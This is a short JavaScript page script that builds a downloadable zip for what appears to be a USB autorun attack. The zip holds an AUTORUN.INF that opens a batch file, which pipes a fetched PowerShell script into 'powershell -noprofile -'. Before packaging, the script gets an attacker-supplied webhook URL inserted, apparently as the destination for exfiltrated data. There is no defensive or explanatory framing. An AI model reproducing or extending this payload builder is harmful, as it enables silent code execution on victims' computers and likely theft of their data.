var $webhook = document.querySelector('#webhookurl');
var $download = document.querySelector('#download');

async function getScript(){
    return await (await fetch("./script.ps1")).text()
}

function Initialize(){
    getScript().then(text => {
        $download.disabled = false;
        Window.SOURCE_SCRIPT = text;
    });

    $download.addEventListener('click', () => CreatePackage($webhook.value));
};

function CreatePackage(webhook){
    if(!Window.SOURCE_SCRIPT) return alert("Source script is not ready!")
    
    var zip = new JSZip();
    zip.file("AUTORUN.INF", `[autorun]\nopen=execute.bat`);
    zip.file("execute.bat", `type s | powershell -noprofile -`);
    zip.file("s", Window.SOURCE_SCRIPT.replace("{PACKAGE.WEBHOOKURL}", webhook));
    zip.generateAsync({ type: "blob" }).then(data => saveAs(data, "package.zip"));
};


Initialize();